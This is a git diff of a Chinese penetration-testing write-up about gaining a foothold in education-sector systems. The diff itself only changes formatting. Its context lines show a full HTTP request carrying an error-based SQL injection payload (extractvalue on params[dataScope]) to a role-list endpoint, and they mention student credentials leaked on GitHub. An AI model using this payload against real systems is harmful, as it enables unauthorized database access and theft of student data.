@@ -1,4 +1,4 @@
-# 教育行业渗透打点
+﻿# 教育行业渗透打点
 
 
 <!--more-->
@@ -97,7 +97,7 @@ GitHub泄漏学号密码
 
 记录回包内容
 
-```php
+```
 "datas":"{\"sign\":\"407ec6dc275f4766a4525e059a60ca16\"}","code":"0","message":"获取成功"
 ```
 
@@ -215,7 +215,7 @@ sql注入当时也懒得去尝试，估计也是存在的
 
 /system/dept/edit
 
-```php
+```
 POST /system/role/list HTTP/1.1 Host: Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=e9f143b9-3c3d-4acb-96a4-93c7367a98e9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 75 params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
 ```
 
